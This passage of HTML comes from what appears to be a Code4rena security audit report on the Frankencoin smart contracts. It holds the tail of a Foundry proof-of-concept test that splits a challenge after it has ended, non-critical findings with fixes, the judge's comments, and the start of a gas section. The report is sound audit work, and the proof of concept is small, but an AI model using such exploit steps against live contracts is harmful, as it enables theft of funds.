class=\"mtk1\">.</span><span class=\"mtk11\">challenge</span><span class=\"mtk1\">(</span><span class=\"mtk12\">hub</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">position</span><span class=\"mtk1\">), </span><span class=\"mtk7\">1001</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">bidAmount</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">bob</span><span class=\"mtk1\">.</span><span class=\"mtk11\">obtainFrankencoins</span><span class=\"mtk1\">(</span><span class=\"mtk12\">swap</span><span class=\"mtk1\">, </span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">bob</span><span class=\"mtk1\">.</span><span class=\"mtk11\">bid</span><span class=\"mtk1\">(</span><span class=\"mtk12\">hub</span><span class=\"mtk1\">, </span><span class=\"mtk12\">challengeNumber</span><span class=\"mtk1\">, </span><span class=\"mtk12\">bidAmount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">skip</span><span class=\"mtk1\">(</span><span class=\"mtk7\">7</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">86_400</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">60</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">startPrank</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">alice</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">hub</span><span class=\"mtk1\">.</span><span class=\"mtk11\">splitChallenge</span><span class=\"mtk1\">(</span><span class=\"mtk12\">challengeNumber</span><span class=\"mtk1\">, </span><span class=\"mtk7\">500</span><span class=\"mtk1\">); </span><span class=\"mtk3\">// @audit</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">hub</span><span class=\"mtk1\">.</span><span class=\"mtk11\">end</span><span class=\"mtk1\">(</span><span class=\"mtk12\">challengeNumber</span><span class=\"mtk1\">); </span><span class=\"mtk3\">// @audit</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">stopPrank</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-26\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-26\" aria-label=\"recommended mitigation steps 26 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Add <code>if (block.timestamp >= challenge.end) revert TooLate();</code> to the <code>splitChallenge</code> function</p>\n<h2 id=\"non-critical-issues\" style=\"position:relative;\"><a href=\"#non-critical-issues\" aria-label=\"non critical issues permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Non-Critical Issues</h2>\n<p>• [N-01] No way to track challenges created by a user</p>\n<p>• [N-02] Equity tokens sent to oneself are processed to update votes</p>\n<p>• [N-03] Misleading comment about position <code>start</code> value</p>\n<p>• [N-04] Rebasing tokens can lead to bad accountability of the positions</p>\n<h2 id=\"n-01-no-way-to-track-challenges-created-by-a-user\" style=\"position:relative;\"><a href=\"#n-01-no-way-to-track-challenges-created-by-a-user\" aria-label=\"n 01 no way to track challenges created by a user permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N-01] No way to track challenges created by a user</h2>\n<p>Challenges launched via the MintingHub are added to a general <code>challenges</code> array.</p>\n<p>But it will be troublesome to track all challenges created by a user as long as that array grows, especially considering that anyone can split challenges and make that array grow faster than expected.</p>\n<h3 id=\"recommended-mitigation-steps-27\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-27\" aria-label=\"recommended mitigation steps 27 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Create a mapping that tracks the challenges launched by users, and also adds them when challenges are splitted.</p>\n<h2 id=\"n-02-equity-tokens-sent-to-oneself-are-processed-to-update-votes\" style=\"position:relative;\"><a href=\"#n-02-equity-tokens-sent-to-oneself-are-processed-to-update-votes\" aria-label=\"n 02 equity tokens sent to oneself are processed to update votes permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N-02] Equity tokens sent to oneself are processed to update votes</h2>\n<p>Tokens sent are pre-processed in <code>_beforeTokenTransfer</code>. The <code>adjustRecipientVoteAnchor</code> and <code>adjustTotalVotes</code> are called, where calculations for the user and the total votes are made.</p>\n<p>In the current codebase it doesn’t generate any issues, but any uncatched precision loss or some subtle changes to those calculations could be used to perform some exploit.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"50\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_beforeTokenTransfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">from</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">to</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">) </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk4\">super</span><span class=\"mtk1\">.</span><span class=\"mtk11\">_beforeTokenTransfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">from</span><span class=\"mtk1\">, </span><span class=\"mtk12\">to</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">){</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// No need to adjust the sender votes. When they send out 10% of their shares, they also lose 10% of</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// their votes so everything falls nicely into place.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// Recipient votes should stay the same, but grow faster in the future, requiring an adjustment of the anchor.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">roundingLoss</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">adjustRecipientVoteAnchor</span><span class=\"mtk1\">(</span><span class=\"mtk12\">to</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// The total also must be adjusted and kept accurate by taking into account the rounding error.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">adjustTotalVotes</span><span class=\"mtk1\">(</span><span class=\"mtk12\">from</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">, </span><span class=\"mtk12\">roundingLoss</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-04-frankencoin/blob/main/contracts/Equity.sol#L112-L122\">Link to code</a></p>\n<h3 id=\"recommended-mitigation-steps-28\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-28\" aria-label=\"recommended mitigation steps 28 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>The current implementation makes the users sending the tokens lose the votes. This can be the expected behavior.</p>\n<p>The following suggestions adds some safety to the function, but in exchange, it changes the original functionality. With this change, users will not lose votes if they send tokens to themselves:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"51\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    function _beforeTokenTransfer(address from, address to, uint256 amount) override internal {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        super._beforeTokenTransfer(from, to, amount);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        if (amount &gt; 0){</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        if (amount &gt; 0 &amp;&amp; from != to){</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            // No need to adjust the sender votes. When they send out 10% of their shares, they also lose 10% of</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            // their votes so everything falls nicely into place.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            // Recipient votes should stay the same, but grow faster in the future, requiring an adjustment of the anchor.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            uint256 roundingLoss = adjustRecipientVoteAnchor(to, amount);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            // The total also must be adjusted and kept accurate by taking into account the rounding error.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            adjustTotalVotes(from, amount, roundingLoss);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<h2 id=\"n-03-misleading-comment-about-position-start-value\" style=\"position:relative;\"><a href=\"#n-03-misleading-comment-about-position-start-value\" aria-label=\"n 03 misleading comment about position start value permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N-03] Misleading comment about position <code>start</code> value</h2>\n<p>The code suggests that there is “one week” time to deny the position</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"52\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">start</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">initPeriod</span><span class=\"mtk1\">; </span><span class=\"mtk3\">// one week time to deny the position</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-04-frankencoin/blob/main/contracts/Position.sol#L64\">Link to code</a></p>\n<p>But some lines before it specifies <code>3 days</code>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"53\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">initPeriod</span><span class=\"mtk1\"> &gt;= </span><span class=\"mtk7\">3</span><span class=\"mtk1\"> </span><span class=\"mtk12\">days</span><span class=\"mtk1\">); </span><span class=\"mtk3\">// must be at least three days, recommended to use higher values</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-04-frankencoin/blob/main/contracts/Position.sol#L53\">Link to code</a></p>\n<h3 id=\"recommended-mitigation-steps-29\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-29\" aria-label=\"recommended mitigation steps 29 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Fix the comment or the required value</p>\n<h2 id=\"n-04-rebasing-tokens-can-lead-to-bad-accountability-of-the-positions\" style=\"position:relative;\"><a href=\"#n-04-rebasing-tokens-can-lead-to-bad-accountability-of-the-positions\" aria-label=\"n 04 rebasing tokens can lead to bad accountability of the positions permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N-04] Rebasing tokens can lead to bad accountability of the positions</h2>\n<p>Rebasing tokens change the <code>balanceOf</code> value of the accounts that hold their tokens.</p>\n<p>Using rebasing tokens as collateral for positions can lead to positions minting more tokens than expected, or challenges created, averted or won with different amounts than expected.</p>\n<p>I would suggest not allowing rebasing tokens to be used on the protocol.</p>\n<p><strong><a href=\"hhttps://github.com/code-423n4/2023-04-frankencoin-findings/issues/597#issuecomment-1554593780\">hansfriese (judge) commented</a>:</strong></p>\n<blockquote>\n<p>[N-02]: It can be seen as a low risk when from = to.<br>\n[N-03]: The documentation said 7 days during contest period, so this can be a low risk.</p>\n</blockquote>\n<hr>\n<h1 id=\"gas-optimizations\" style=\"position:relative;\"><a href=\"#gas-optimizations\" aria-label=\"gas optimizations permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Gas Optimizations</h1>\n<p>For this audit, 43 reports were submitted by wardens detailing gas optimizations. The <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/956\">report highlighted below</a> by <strong>c3phas</strong> received the top score from the judge.</p>\n<p><em>The following wardens also submitted reports: <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/977\">naman1778</a>,\n<a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/957\">EvanW</a>,\n<a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/955\">MohammedRizwan</a>,\n<a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/948\">Udsen</a>,\n<a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/937\">aria</a>,\n<a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/905\">nadin</a>,\n<a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/903\">Aymen0909</a>,\n<a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/890\">Breeje</a>,\n<a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/889\">decade</a>,\n<a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/888\">karanctf</a>,\n<a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/863\">0xSmartContract</a>,\n<a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/827\">Rageur</a>,\n<a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/822\">0xDACA</a>,\n<a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/788\">hunter_w3b</a>,\n<a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/783\">slvDev</a>,\n<a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/781\">DishWasher</a>,\n<a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/766\">ReyAdmirado</a>,\n<a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/756\">xmxanuel</a>,\n<a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/754\">matrix_0wl</a>,\n<a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/697\">Erko</a>,\n<a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/696\">niser93</a>,\n<a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/690\">__141345__</a>,\n<a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/620\">SAAJ</a>,\n<a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/559\">pfapostol</a>,\n<a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/427\">Raihan</a>,\n<a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/415\">trysam2003</a>,\n<a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/379\">JCN</a>,\n<a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/355\">Satyam_Sharma</a>,\n<a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/348\">BenRai</a>,\n<a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/330\">RaymondFam</a>,\n<a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/298\">sebghatullah</a>,\n<a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/235\">codeslide</a>,\n<a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/220\">0xnev</a>,\n<a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/218\">petrichor</a>,\n<a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/174\">pavankv</a>,\n<a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/153\">fatherOfBlocks</a>,\n<a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/128\">Sathish9098</a>,\n<a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/126\">Proxy</a>,\n<a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/105\">Polaris_tow</a>,\n<a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/91\">NoamYakov</a>,\n<a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/60\">0xRB</a>, and\n<a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/3\">0xhacksmithh</a>.</em></p>\n<h2 id=\"notes\" style=\"position:relative;\"><a href=\"#notes\" aria-label=\"notes permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Notes</h2>\n<p>NB: Some functions have been truncated where necessary to just show affected parts of the code.\nThrough out the report some places might be denoted with audit tags to show the actual place affected.</p>\n<h2 id=\"g-01--ifsrequire-statements-that-check-input-arguments-should-be-at-the-top-of-the-function\" style=\"position:relative;\"><a href=\"#g-01--ifsrequire-statements-that-check-input-arguments-should-be-at-the-top-of-the-function\" aria-label=\"g 01  ifsrequire statements that check input arguments should be at the top of the function permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-01]  IF’s/require() statements that check input arguments should be at the top of the function</h2>\n<p>Checks that involve constants should come before checks that involve state variables, function calls, and calculations. By doing these checks first, the function is able to revert before wasting a Gcoldsload (2100 gas) in a function that may ultimately revert in the unhappy case.</p>\n<p><a href=\"https://github.com/code-423n4/2023-04-frankencoin/blob/1022cb106919fba963a89205d3b90bf62543f68f/contracts/Equity.sol#L290-L297\">https://github.com/code-423n4/2023-04-frankencoin/blob/1022cb106919fba963a89205d3b90bf62543f68f/contracts/Equity.sol#L290-L297</a></p>\n<h3 id=\"cheaper-to-check-the-function-parameter-before-making-an-external-function-call\" style=\"position:relative;\"><a href=\"#cheaper-to-check-the-function-parameter-before-making-an-external-function-call\" aria-label=\"cheaper to check the function parameter before making an external function call permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 